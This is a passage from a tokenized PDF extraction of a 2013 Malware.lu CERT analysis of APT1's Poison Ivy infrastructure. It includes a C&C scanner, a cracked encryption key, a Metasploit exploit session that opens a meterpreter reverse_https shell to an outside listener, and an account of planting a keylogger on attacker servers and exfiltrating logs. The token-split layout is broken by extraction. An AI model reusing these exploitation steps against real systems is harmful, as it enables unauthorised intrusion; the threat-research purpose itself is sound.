"interface", "with", "a", "shell", "......................................................................................"], ["14", "Figure", "6", ":", "Example", "of", "network", "target", "diagram", "................................................................................"], ["17", "Figure", "7", ":", "Terminator", "password", "......................................................................................................"], ["18", "Figure", "8", ":", "Terminator", "CRC", "algorithm", ".............................................................................................."], ["19", "Figure", "9", ":", "Terminator", "xor", "and", "compare", "operation", "on", "the", "password", "................................................", "19"], ["Figure", "10", ":", "Terminator", ":"], ["starting", "interface", "........................................................................................"], ["20"], ["Figure", "11", ":", "Terminator", ":"], ["Protocol", "and", "port", "choice", "............................................................................", "20"], ["Figure", "12", ":", "Terminator", ":", "List", "of", "infected", "machines", "..........................................................................."], ["20", "Figure", "13", ":", "Terminator", ":", "List", "of", "features", "..........................................................................................."], ["21", "Figure", "14", ":", "Terminator", ":", "List", "of", "processes", "on", "the", "infected", "machine", "................................................."], ["22"], ["Figure", "15", ":", "Terminator", ":", "List", "of", "opened", "ports", "on", "the", "infected", "machine", "............................................."], ["22"], ["Figure", "16", ":", "Terminator", ":"], ["Remote", "shell", "on", "the", "infected", "machine", "......................................................."], ["23"], ["Figure", "17", ":", "Terminator", ":"], ["Registry", "access", "to", "the", "infected", "machine", "...................................................."], ["23", "Figure", "18", ":", "Terminator", ":", "Services", "management", "on", "the", "infected", "machine", "........................................"], ["24", "Figure", "19", ":", "Terminator", ":", "Information", "about", "the", "infected", "machine", "....................................................."], ["24", "Figure", "20", ":", "Terminator", ":", "Installed", "software", "on", "the", "infected", "machine", "................................................"], ["25", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "4", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "1", "Introduction", "1.1", "Context"], ["The", "company", "Mandiant", "published", "in", "February", "2013", "a", "report", "about", "an", "Advance", "Persistent", "Threat", "(", "APT", ")", "called", "APT1", "."], ["The", "report", "can", "be", "freely", "downloaded", "here", ":"], ["http://intelreport.mandiant.com/."], ["Inspired", "by", "this", "article", ",", "we", "have", "decided", "to", "perform", "our", "own", "technical", "analysis", "of", "this", "case", "."], ["In", "the", "report", ",", "Mandiant", "explains", "that", "the", "attackers", "were", "using", "a", "well", "-", "known", "Remote", "Administration", "Tool"], ["(", "RAT", ")", "called", "Poison", "Ivy", "and", "that", "they", "were", "located", "in", "China", "."], ["We", "based", "our", "investigation", "based", "on", "those", "two", "facts", "only", "."], ["1.2", "Objectives"], ["The", "objective", "of", "the", "mission", "was", "to", "understand", "how", "these", "attackers", "work", "."], ["Our", "purpose", "was", "to", "identify", "their", "infrastructures", ",", "their", "methodologies", "and", "also", "the", "tools", "they", "used", "."], ["We", "are", "convinced", "that", "in", "order", "to", "protect", "our", "infrastructures", "against", "this", "kind", "of", "attacks", ",", "we", "need", "to", "analyse", ",", "learn", "and", "understand", "the", "way", "attackers", "work", "."], ["1.3", "Authors"], ["This", "report", "has", "been", "created", "by", "Malware.lu", "CERT", ",", "the", "first", "private", "Computer", "Security", "Incident", "Response", "Team", "(", "CSIRT", ")", "located", "in", "Luxembourg", "and", "itrust", "consulting", "S.A.R.L", ",", "a", "Luxembourg", "based", "company", "specialising", "in", "formation", "system", "security", "."], ["We", "would", "like", "to", "thank", "the", "incident", "response", "teams", "who", "have", "collaborated", "with", "us", "."], ["Thanks", "for", "their", "help", "and", "for", "their", "support", "."], ["1.4", "Ethical", "choices"], ["In", "this", "chapter", "is", "described", "our", "approach", "about", "the", "ethical", "choices", "made", "during", "this", "work", "."], ["First", ",", "we", "warned", "the", "national", "and/or", "private", "Computer", "Security", "Incident", "Response", "Teams", "(", "CSIRT", "-", "CERT", ")", "associated", "to", "the", "targets", "of", "the", "attackers", "."], ["Before", "publishing", "this", "report", ",", "we", "have", "waited", "for", "a", "reasonable", "time", "."], ["Finally", ",", "all", "the", "servers", "from", "which", "we", "collected", "data", "belonged", "to", "the", "attackers", "."], ["We", "do", "not", "attack", "or", "try", "to", "attack", "compromised", "machines", "."], ["1.5", "Document", "structure"], ["This", "document", "is", "structured", "in", "the", "following", "way", ":", "\uf0b7", "Chapter", "2", "deals", "with", "the", "information", "gathering", "phase", ";", "\uf0b7", "Chapter", "3", "describes", "the", "malware", "Poison", "Ivy", "and", "a", "vulnerability", "of", "it", ";", "\uf0b7", "Chapter", "4", "is", "a", "static", "analysis", "of", "samples", ";", "\uf0b7", "Chapter", "5", "deals", "with", "the", "information", "we", "gathered", "on", "the", "attacked", "command", "&", "control", ";", "\uf0b7", "Chapter", "6", "introduces", "an", "homemade", "RAT", "called", "terminator", ";", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "5", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "2", "Information", "gathering", "2.1", "Command", "&", "Control", "scanner"], ["In", "the", "Mandiant", "report", ",", "it", "is", "explained", "that", "the", "attacker", "used", "a", "well", "-", "known", "Remote", "Administration"], ["Tool", "(", "RAT", ")", "called", "Poison", "Ivy", "."], ["This", "RAT", "can", "be", "freely", "downloaded", "here", ":", "http://www.poisonivyrat.com/."], ["This", "RAT", "will", "be", "discussed", "in", "the", "next", "chapter", "."], ["To", "identify", "the", "machines", "that", "were", "using", "this", "RAT", ",", "we", "have", "developed", "a", "Poison", "Ivy", "scanner", "."], ["Here", "is", "the", "code", "of", "this", "scanner", ":", "def", "check_poison(self", ",", "host", ",", "port", ",", "res", "):", "try", ":", "af", ",", "socktype", ",", "proto", ",", "canonname", ",", "sa", "=", "res", "s", "=", "socket.socket(af", ",", "socktype", ",", "proto", ")", "s.settimeout(6", ")"], ["s.connect(sa"], [")", "stage1", "=", "\"", "\\x00", "\"", "*", "0x100", "s.sendall(stage1", ")", "data", "=", "s.recv(0x100", ")", "if", "len(data", ")", "!"], ["=", "0x100", ":", "s.close", "(", ")", "return", "data", "=", "s.recv(0x4", ")"], ["s.close", "(", ")"], ["if", "data", "!", "=", "\"", "\\xD0\\x15\\x00\\x00", "\"", ":", "return", "print", "\"", "%", "s", "Poison", "%", "s", "%", "s:%d", "\"", "%", "(", "datetime.datetime.now", "(", ")", ","], ["sa[0", "]", ",", "sa[1", "]", ")"], ["except", "socket.timeout", "as", "e", ":", "pass", "except", "socket.error", "as", "e", ":", "pass", "host", ",", "The", "scanner", "sends", "100", "times", "0x00", "to", "a", "specific", "port", "and", "IP", "."], ["If", "in", "the", "response", "the", "server", "sends", "back", "100", "other", "bytes", "followed", "by", "the", "specific", "data", "0x000015D0", ",", "we", "know", "that", "the", "running", "service", "is", "a", "Poison", "Ivy", "server", "."], ["We", "chose", "to", "scan", "the", "following", "ports", ":"], ["\uf0b7", "\uf0b7", "\uf0b7", "\uf0b7", "3460", "(", "default", "Poison", "Ivy", "port", ")"], ["80", "(", "HTTP", "port", ")"], ["443", "(", "HTTPS", "port", ")"], ["8080", "(", "alternate", "HTTP", "port", ")", "."], ["We", "decided", "to", "scan", "a", "wide", "IP", "range", "located", "in", "Hong", "Kong", "."], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "6", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "2.2", "IP", "ranges"], ["After", "removing", "false", "positives", ",", "we", "identified", "6", "IP", "ranges", "where", "Poison", "Ivy", "Command", "&", "Control", "servers", "were", "running", ":", "-", "113.10.246.0", "-", "113.10.246.255", ":", "managed", "by", "NWT", "Broadband", "Service", "202.65.220.0", "-", "202.65.220.255", ":", "managed", "by", "Pacific", "Scene", "202.67.215.0", "-", "202.67.215.255", ":", "managed", "by", "HKNet", "Company", "210.3.0.0", "-", "210.3.127.255", ":", "managed", "by", "Hutchison", "Global", "Communications", "219.76.239.216", "-", "219.76.239.223", ":", "managed", "by", "WINCOME", "CROWN", "LIMITED"], ["70.39.64.0", "\u2013", "70.39.127.255", ":", "managed", "by", "Sharktech", "2.3", "Working", "hours"], ["We", "had", "some", "difficulties", "to", "identify", "the", "C&C", "servers", "because", "the", "attackers", "stopped", "the", "Poison", "Ivy", "daemon", "when", "they", "were", "not", "using", "it", "."], ["That", "explains", "why", "the", "scanner", "did", "not", "identify", "all", "the", "C&C", "servers", "at", "certain", "moments", "of", "the", "day", "."], ["However", ",", "using", "this", "parameter", ",", "we", "were", "able", "to", "identify", "their", "working", "hours", "."], ["Here", "is", "the", "average", "working", "hours", "for", "a", "week", "(", "the", "hour", "on", "the", "graph", "is"], ["UTC+1", "):", "Figure", "1", ":"], ["Attackers", "working", "hours"], ["Generally", ",", "the", "attackers", "worked", "between", "2AM", "and", "10AM", "from", "Monday", "to", "Saturday", "included", "."], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "7", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "3", "Poison", "Ivy", "3.1", "Description"], ["Poison", "Ivy", "is", "a", "Remote", "Administration", "Tool", "(", "RAT", ")", "available", "here", ":", "http://www.poisonivyrat.com/index.php?link=download", "."], ["This", "RAT", "is", "well", "documented", "on", "the", "Internet", "."], ["Here", "is", "a", "short", "list", "of", "the", "features", "it", "provides", ":", "-", "File", "management", ";", "File", "search", ";", "File", "transfer", ";", "Registry", "management", ";", "Process", "management", ";", "Services", "management", ";", "Remote", "shell", ";"], ["Screenshot", "creation", ";", "Hash", "stealing", ";", "Audio", "capture", ";", "\u2026", "3.2", "Remote", "code", "execution", "vulnerability"], ["An", "exploitable", "vulnerability", "has", "been", "discovered", "by", "Andrzej", "Dereszowski", "from", "SIGNAL", "11", "."], ["The", "description", "of", "the", "vulnerability", "can", "be", "found", "here", ":", "http://www.signal11.eu/en/research/articles/", "targeted_2010.pdf", "."], ["This", "vulnerability", "allows", "the", "remote", "execution", "of", "arbitrary", "code", "on", "the", "command", "&", "control", "server", "."], ["Metasploit", "framework", "provides", "an", "exploit", "to", "use", "this", "vulnerability", "."], ["The", "code", "is", "available", "here", ":", "http://dev.metasploit.com/redmine/projects/framework/repository/entry/", "modules", "/", "exploits", "/", "windows", "/", "misc", "/", "poisonivy_bof.rb", "."], ["This", "exploit", "did", "not", "work", "in", "our", "context", "."], ["The", "exploit", "has", "two", "possible", "exploitations", ":", "-", "by", "using", "the", "default", "password", ":", "admin", "by", "using", "brute", "force", "As", "the", "two", "methods", "did", "not", "work", ";", "we", "created", "a", "third", "one", "."], ["This", "method", "consists", "of", "finding", "the", "real", "password", "used", "for", "the", "encryption", "."], ["Our", "homemade", "exploit", "with", "an", "option", "for", "the", "password", "is", "available", "in", "Appendix", "."], ["For", "information", ",", "an", "additional", "Ruby", "package", "is", "needed", "to", "use", "the", "camellia", "cipher", "."], ["The", "package", "can", "be", "installed", "using", "the", "gem", "command", ":", "root@alien", ":", "#", "gem", "install", "camellia", "-", "rb"], ["The", "next", "step", "was", "to", "find", "the", "password", "used", "to", "encrypt", "the", "communication", "."], ["3.3", "Encryption", "key", "brute", "forcing"], ["The", "RAT", "uses", "a", "key", "to", "encrypt", "the", "communication", "."], ["The", "password", "is", "set", "by", "the", "administrator", "and", "its", "default", "value", "is", "\u201c", "admin", "\u201d", "."], ["After", "a", "quick", "search", "on", "the", "Internet", ",", "we", "know", "that", "Poison", "Ivy", "uses"], ["Camellia", "as", "encryption", "algorithm", "."], ["The", "encryption", "is", "made", "with", "16", "bytes", "blocks", "."], ["So", "we", "decided", "to", "choose", "the", "following", "approach", ":", "-", "Send", "100", "bytes", "(", "with", "0x00", ")", "to", "the", "daemon", "(", "same", "than", "in", "our", "scanner", ")"], ["Get", "the", "first", "16", "bytes", "as", "result", "from", "the", "server"], ["Here", "is", "the", "formula", "of", "the", "result", ":"], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "8", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "Result", "=", "Camellia(16", "*", "0x00", ",", "key", ")"], ["The", "result", "is", "not", "a", "printable", "value", "."], ["Thus", ",", "we", "decided", "to", "make", "a", "base64", "of", "this", "value", "and", "add", "the", "flag", "$", "camellia$", "to", "identify", "the", "algorithm", "."], ["Here", "is", "an", "example", "of", "result", ":", "$", "camellia$ItGoyeyQIvPjT", "/", "qBoDKQZg=="], ["To", "get", "the", "key", ",", "we", "developed", "a", "\u201c", "John", "the", "Ripper", "\u201d", "extension", "."], ["\u201c", "John", "the", "Ripper", "\u201d", "is", "an", "open", "source", "password", "cracker", "."], ["The", "source", "code", "can", "be", "downloaded", "here", ":", "http://www.openwall.com/john/."], ["OpenSSL", "provides", "the", "camellia", "algorithm", "."], ["The", "code", "source", "of", "the", "\u201c", "John", "the", "Ripper", "\u201d", "plugin", "to", "crack", "camellia", "hashes", "by", "using", "the", "OpenSSL", "library", "is", "available", "in", "the", "appendix", "."], ["After", "compiling", "\u201c", "John", "the", "Ripper", "\u201d", ",", "a", "new", "format", "is", "available", ":", "camellia", "."], ["Here", "is", "an", "example", "of", "a", "brute", "force", "session", ":", "rootbsd@alien:~/john-1.7.9", "-", "jumbo-7", "/", "run$", "cat", "test.txt", "$", "camellia$ItGoyeyQIvPjT", "/", "qBoDKQZg==", "rootbsd@alien:~/john-1.7.9", "-", "jumbo-7", "/", "run$", "./john", "--format", "=", "camellia", "test.txt"], ["Loaded", "1", "password", "hash", "(", "Camellia", "bruteforce", "[", "32/32", "]", ")"], ["No", "password", "hashes", "left", "to", "crack", "(", "see", "FAQ", ")"], ["rootbsd@alien:~/john-1.7.9", "-", "jumbo-7", "/", "run$", "./john"], ["--show", "test.txt", "?"], [":", "pswpsw", "1", "password", "hash", "cracked", ",", "0", "left"], ["The", "key", "is", "\u201c", "pswpsw", "\u201d", "."], ["This", "key", "must", "be", "used", "in", "our", "homemade", "Metasploit", "exploit", "."], ["3.4", "Exploitation"], ["With", "the", "information", "we", "previously", "described", ",", "we", "were", "able", "to", "get", "access", "to", "the", "attackers", "servers", "."], ["msf", "exploit(poisonivy_bof_v2", ")", ">", "show", "options", "Module", "options", "(", "exploit", "/", "windows", "/", "misc", "/", "poisonivy_bof_v2", "):", "Name", "---Password", "RANDHEADER"], ["RHOST"], ["RPORT", "Current", "Setting"], ["--------------pswpsw", "false"], ["X.X.X.X", "80", "Required"], ["-------yes"], ["yes"], ["yes", "yes", "Description", "----------Client", "password"], ["Send", "random", "bytes", "as", "the", "header"], ["The", "target", "address"], ["The", "target", "port", "Payload", "options", "(", "windows", "/", "meterpreter", "/", "reverse_https", "):", "Name"], ["---EXITFUNC", "LHOST", "LPORT", "Current", "Setting", "--------------thread"], ["my_server", "8443"], ["Required"], ["-------yes"], ["yes", "yes", "Description"], ["----------Exit", ":", "seh", ",", "thread", ",", "process", ",", "none"], ["The", "local", "listener", "hostname"], ["The", "local", "listener", "port", "Exploit", "target", ":", "I", "d", "Name", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "9", "of", "48", "Type", "Project"], ["Title", "Classification", "-0"], ["Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public"], ["---Poison", "Ivy", "2.3.2", "/", "Windows", "XP", "SP3", "/", "Windows", "7", "SP1", "msf", "exploit(poisonivy_bof_v2", ")", ">", "exploit"], ["[", "*", "]", "Started", "HTTPS", "reverse", "handler", "on", "https://my_server:8443/"], ["[", "*", "]", "Meterpreter", "session", "1", "opened", "(", "my_server:8443", "-", ">", "Y.Y.Y.Y:3325", ")", "at", "2013", "-", "03", "-", "07", "07:51:57", "+0100", "meterpreter", ">", "ipconfig"], ["Interface", "1", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["="], ["Name", "Hardware", "MAC", "MTU", "IPv4"], ["Address", "IPv4"], ["Netmask", ":", ":", ":", ":", ":", "MS", "TCP", "Loopback", "interface"], ["00:00:00:00:00:00", "1520", "127.0.0.1", "255.0.0.0", "Interface", "2", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["Name", ":"], ["AMD", "PCNET", "\ufffd", "\ufffd", "\ufffd", "\u202b"], ["\ufffd"], ["\ufffd", "\u0770\u202c\u01bb", "\ufffd", "\ufffd"], ["\ufffd"], ["\ufffd"], ["\ufffd", "\u202b"], ["\ufffd", "\u02ff\u0770", "\ufffd", "\u0770\u202c"], ["Hardware", "MAC", ":", "00:0c:29", ":", "c9:86:57", "MTU", ":", "1500", "IPv4"], ["Address", ":", "192.168.164.128", "IPv4"], ["Netmask", ":", "255.255.255.0", "Family", "PCI", "Ethernet", "Adapter", "-", "Once", "connected", "to", "the", "Poison", "Ivy", "server", ",", "we", "noticed", "that", "the", "server", "had", "no", "public", "IP", "."], ["We", "attacked", "a", "server", "with", "the", "IP", "X.X.X.X", "(", "identified", "during", "the", "scan", ")", "and", "the", "meterpreter", "endpoint", "IP", "address", "was", "Y.Y.Y.Y."], ["We", "concluded", "that", "the", "Poison", "Ivy", "daemon", "was", "hidden", "behind", "a", "proxy", "server", ",", "by", "using", "port", "forwarding", "to", "hide", "the", "real", "IP", "of", "the", "command", "&", "control", "server", "."], ["We", "could", "also", "identify", "that", "the", "vendor", "ID", "of", "the", "MAC", "address", "is", "VMWare", "."], ["By", "listing", "the", "processes", ",", "we", "are", "able", "to", "validate", "this", "hypothesis", ":", "meterpreter", ">", "ps", "aux", "Process", "List", "=", "=", "=", "=", "=", "=", "=", "=", "=", "=", "="], ["="], ["PID"], ["--0", "4", "248", "272", "440"], ["704"], ["712", "736", "780"], ["792"], ["896"], ["960", "PPID"], ["---0", "0"], ["704", "780", "4", "604", "440", "440", "736", "736", "1228", "780", "Name", "---[System", "Process", "]"], ["System", "P232.exe"], ["alg.exe", "smss.exe", "explorer.exe", "csrss.exe", "winlogon.exe", "services.exe", "lsass.exe", "wuauclt.exe", "vmacthlp.exe", "User", "----"], ["Path", "----", "WILLOW-3796929A\\willow", "976", "1048", "1176", "780", "780", "704", "svchost.exe", "svchost.exe", "VMwareTray.exe", "NT", "AUTHORITY\\SYSTEM"], ["WILLOW-3796929A\\willow", "1200", "780", "cmdagent.exe", "NT", "AUTHORITY\\SYSTEM", "C:\\VIP\\IVY\\P232.exe", "C:\\WINDOWS\\System32\\alg.exe", "\\SystemRoot\\System32\\smss.exe", "C:\\WINDOWS\\Explorer", "."], ["EXE", "\\??\\C:\\WINDOWS\\system32\\csrss.exe", "\\??\\C:\\WINDOWS\\system32\\winlogon.exe", "C:\\WINDOWS\\system32\\services.exe", "C:\\WINDOWS\\system32\\lsass.exe", "C:\\WINDOWS\\system32\\wuauclt.exe", "C:\\Program", "Files\\VMware\\VMware"], ["Tools\\vmacthlp.exe"], ["C:\\WINDOWS\\system32\\svchost.exe"], ["C:\\WINDOWS\\system32\\svchost.exe", "C:\\Program", "Files\\VMware\\VMware", "Tools\\VMwareTray.exe", "C:\\Program", "Files\\COMODO\\COMODO", "Internet", "NT", "AUTHORITY\\SYSTEM"], ["WILLOW-3796929A\\willow", "NT", "AUTHORITY\\SYSTEM", "NT", "AUTHORITY\\SYSTEM", "NT", "AUTHORITY\\SYSTEM", "NT", "AUTHORITY\\SYSTEM", "WILLOW-3796929A\\willow", "NT", "AUTHORITY\\SYSTEM", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "10", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "1228", "1328", "780", "704", "svchost.exe", "VMwareUser.exe", "NT", "AUTHORITY\\SYSTEM"], ["WILLOW-3796929A\\willow", "1384", "1448", "1472", "780", "780", "780", "svchost.exe", "svchost.exe", "ZhuDongFangYu.exe", "NT", "AUTHORITY\\SYSTEM", "1568", "1592", "1860", "780", "704", "780", "spoolsv.exe", "ctfmon.exe", "VMwareService.exe", "NT", "AUTHORITY\\SYSTEM"], ["WILLOW-3796929A\\willow", "NT", "AUTHORITY\\SYSTEM", "2232", "3072"], ["3196", "1044", "3032", "704", "xPort.exe"], ["conime.exe", "cfp.exe", "WILLOW-3796929A\\willow", "WILLOW-3796929A\\willow", "WILLOW-3796929A\\willow", "Security\\cmdagent.exe"], ["C:\\WINDOWS\\system32\\svchost.exe", "C:\\Program", "Files\\VMware\\VMware", "Tools\\VMwareUser.exe"], ["C:\\WINDOWS\\system32\\svchost.exe", "C:\\WINDOWS\\system32\\svchost.exe", "C:\\Program"], ["Files\\360\\360Safe\\", "deepscan\\zhudongfangyu.exe", "C:\\WINDOWS\\system32\\spoolsv.exe", "C:\\WINDOWS\\system32\\ctfmon.exe", "C:\\Program", "Files\\VMware\\VMware", "Tools\\VMwareService.exe", "C:\\VIP\\CMD\\xPort.exe", "C:\\WINDOWS\\system32\\conime.exe", "C:\\Program", "Files\\COMODO\\COMODO", "Internet", "Security\\cfp.exe"], ["3.5", "Shellcode"], ["After", "a", "few", "days", "the", "attackers", "detected", "our", "presence", "on", "their", "systems", ",", "particularly", "because", "of", "the", "network", "connections", "between", "their", "Poison", "Ivy", "machines", "and", "our", "machines", "."], ["Using", "the", "netstat", "command", "they", "were", "able", "to", "detect", "our", "connection", "."], ["Basically", ",", "the", "Poison", "Ivy", "server", "only", "had", "connections", "originating", "from", "the", "proxy", "server", "and", "no", "connection", "from", "any", "other", "IP", "."], ["In", "order", "to", "stay", "stealth", "we", "had", "to", "connect", "to", "the", "Poison", "Ivy", "server", "through", "the", "proxy", "server", "."], ["To", "establish", "this", "connection", "we", "decided", "to", "create", "our", "own", "shellcode", "."], ["The", "principle", "of", "our", "shellcode", "is", "as", "follows", ":", "-", "Once", "injected", "in", "a", "process", ",", "the", "shellcode", "looks", "for", "open", "sockets", ";", "Once", "a", "opened", "socket", "is", "detected", ",", "this", "socket", "is", "closed", ";"], ["After", ",", "the", "shellcode", "binds", "itself", "on", "the", "previous", "open", "port", ";"], ["From", "now", "on", ",", "we", "are", "going", "to", "use", "the", "same", "technique", "than", "the", "one", "used", "in", "meterpreter", "(", "bind_tcp", ")", "."], ["Our", "shellcode", "goal", "is", "to", "close", "the", "Poison", "Ivy", "daemon", "\u2019s", "socket", "and", "then", "open", "our", "own", "socket", "on", "the", "same", "port", "."], ["Once", "our", "socket", "is", "opened", "we", "can", "use", "the", "proxy", "chains", "provided", "by", "the", "attackers", "to", "connect", "to", "the", "Poison", "Ivy", "server", "."], ["In", "this", "case", ",", "when", "attackers", "checked", "the", "opened", "connections", "using", "netstat", "they", "could", "not", "identify", "our", "connection", "since", "it", "appeared", "to", "be", "originating", "from", "an", "infected", "target", "\u2026"], ["The", "source", "code", "of", "the", "shellcode", "can", "be", "found", "in", "appendix", "."], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "11", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "4", "Information", "obtained", "on", "the", "C&C", "4.1", "Infrastructure", "schema"], ["Our", "investigation", "allowed", "us", "to", "draw", "a", "network", "schema", "of", "the", "attackers", "\u2019", "infrastructure", "."], ["Figure", "2", ":", "Network", "schema"], ["The", "infected", "machines", "communicate", "with", "the", "proxy", "through", "the", "Internet", "."], ["The", "proxy", "server", "will", "forward", "the", "network", "packets", "to", "the", "Poison", "Ivy", "server", "."], ["The", "proxy", "feature", "is", "done", "by", "an", "executable", "called", "xport.exe", "."], ["This", "executable", "can", "encode", "network", "traffic", "using", "a", "xor", "operation", "."], ["This", "feature", "requires", "having", "the", "executable", "running", "on", "both", "machines", ":", "the", "proxy", "and", "the", "Poison", "Ivy", "server", "."], ["The", "syntax", "on", "the", "proxy", "server", "is", ":", "xport.exe", "Proxy_ip", "proxy_port", "Poison_Ivy_ip", "Poison_Ivy_port", "number"], ["The", "argument", "number", "can", "either", "be", "set", "to", "1", "or", "2", "and", "represents", "the", "two", "different", "encoding", "keys", "."], ["The", "syntax", "on", "the", "Poison", "Ivy", "server", "is", ":", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "12", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "xport.exe", "Poison_Ivy_ip", "Poison_Ivy_port", "localhost", "Poison_Ivy_daemon_port", "number"], ["The", "Poison", "Ivy", "server", "is", "managed", "by", "the", "attackers", "through", "a", "VMWare", "remote", "desktop", ",", "so", "that", "we", "were", "not", "able", "to", "get", "the", "real", "IP", "address", "of", "the", "attacker", "."], ["During", "our", "investigation", ",", "we", "identified", "an", "established", "Remote", "Desktop", "Protocol", "(", "RDP", ")", "connection", "between", "the", "Poison", "Ivy", "server", "and", "the", "proxy", "server", "."], ["We", "decided", "to", "install", "a", "key", "-", "logger", "on", "the", "Poison", "Ivy", "server", "that", "allowed", "us", "to", "see", "credentials", "to", "remotely", "connect", "to", "the", "proxy", "server", "."], ["Since", "the", "attackers", "use", "RDP", "to", "manage", "the", "proxy", "server", "and", "that", "we", "had", "access", ",", "we", "copied", "the", "Windows", "event", "logs", "."], ["Those", "logs", "contained", "all", "IPs", "which", "established", "a", "successful", "RDP", "authentication", "."], ["We", "identified", "more", "than", "350", "unique", "IPs", ":", "rootbsd@alien:~/APT1", "$", "cat", "list_ip.txt", "|", "sort", "\u2013", "u", "|", "wc", "-l", "384"], ["We", "suppose", "that", "this", "list", "also", "contains", "Poison", "Ivy", "servers", "IPs", "and", "maybe", "IPs", "of", "attackers", "who", "inadvertently", "connect", "directly", "to", "the", "proxy", ")", "."], ["Here", "is", "the", "screenshot", "of", "the", "proxy", "RDP", "authentication", ":", "Figure", "3", ":", "Proxy", "server", "login", "window"], ["Here", "is", "the", "screenshot", "of", "the", "Poison", "Ivy", "interface", ":", "Figure", "4", ":", "Poison", "Ivy", "interface", "with", "the", "list", "of", "connected", "machines", "Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "13", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public"], ["Here", "is", "the", "screenshot", "of", "an", "attacker", "using", "a", "remote", "shell", "to", "an", "infected", "target", ":", "Figure", "5", ":", "Poison", "Ivy", "interface", "with", "a", "shell", "Using", "those", "accesses", ",", "we", "managed", "to", "exfiltrate", "a", "massive", "amount", "of", "files", ",", "event", "logs", ",", "netstat", "outputs", "\u2026"], ["The", "interesting", "information", "can", "be", "divided", "in", "two", "categories", ":", "-", "Information", "about", "the", "tools", "used", "by", "the", "attackers", ";"], ["Information", "about", "the", "targets", "."], ["Ref", "."], ["RAP002_APT1_Technical_backstage.1.0"], ["Version", "1.0", "Page", "14", "of", "48", "Type", "Project"], ["Title", "Classification", "Public", "document"], ["APT1", ":", "technical", "backstage", "malware", "analysis"], ["Public", "4.2", "Tools"], ["The", "following", "table", "provides", "an", "overview", "on", "the", "discovered", "tools", "."], ["Name", "MD5", "Description", "Keylogger", ",", "log", "in", "%", "APPDATA%/"], ["teeamware.log", "Unknown", ":", "the", "binary", "opens", "ports", "443", "and", "TmUpdate.exe", "b31b9dd9d29330917627f9f916987f3c", "3126"], ["Dumps", "hashes", "."], ["Usage", ":", "ggg.exe", "<", "LSASS"], ["ggg.exe"], ["1295f4a3659cb481b6ae051b61567d7d", "Process", "ID", ">", "<", "HashFileName", ">"], ["Dumps", "Hashes", "(", "64bits", "version", ")", "."], ["Usage", ":"], ["ggg64.exe", "3fd2c4507b23e26d427f89129b2476ac"], ["ggg64.exe", "<", "LSASS", "Process", "ID", ">", "<", "HashFileName", ">"], ["Unknown", ":", "opens", "the", "port", "80", "and", "uses", "the"], ["iochttp.exe", "a476dd10d34064514af906fc37fc12a3", "library", "https://code.google.com/p/spserver/"], ["Unknown", ":", "open", "the", "port", "80", "and", "uses", "the", "iochttp3.exe", "d91a6d50702822330acac8b36b15bb6c", "library", "https://code.google.com/p/spserver/"], ["ippmin.exe", "ffea249e19495e02d61aa52e981cebd8"], ["Unpacked", "version", "of", "TmUpdate.exe"], ["This", "tool", "will", "listen", "on", "the", "port-[localport", "]", "at", "the", "same", "time", ",", "receive", "two", "connections", "m.exe", "5b4d4d6d77954107d927eb1987dd43fb", "on", "the", "same", "port", ",", "and", "exchanges", "data", "between", "two", "connections", "."], ["Usage", ":", "MapPort2", "[", "localport", "]", "[", "localip", "]"], ["This", "tool", "will", "build", "two", "connections", ",", "One", "is", "from", "local", "host", "to", "raddr1", ":", "rport1", ",", "another", "is", "from", "local", "host", "to", "raddr2", ":", "rport2", "and", "it", "will"], ["map.exe"], ["266fbfd5cacfcac975e11a3dacd91923", "exchange", "data", "between", "these", "two", "connections", "."], ["Usage", ":", "MapPort3", "[", "raddr1", "]", "[", "rport1", "]", "[", "raddr2", "]", "[", "rport2", "]", "nc.exe", "ab41b1e2db77cebd9e2779110ee3915d"], ["Official", "netcat", "binary"], ["KeyX.exe", "3d0760bbc1b8c0bc14e8510a66bf6d99", "nc1.exe", "8be39ba7ced43bef5b523193d94320eb", "Packed", "version", "of", "netcat", "nc2.exe", "2937e2b37d8bb3d9fe96ded7e6f763aa", "Packed", "version", "of", "netcat", "putty.exe", "9bb6826905965c13be1c84cc0ff83f42", "Official", "putty", "binary", "xPort.exe", "2aabd170dae5982e5d93dc6fd9f2723a", "Port", "forward", "tool", "pwdump.dll", "7a115108739c7d400b4e036fe995519f", "Password", "dump", "64", "bits", "(", "library", ")"], ["pwdump.exe", "f140e0e9aab19fefb7e47d1ea2e7c560", "Password", 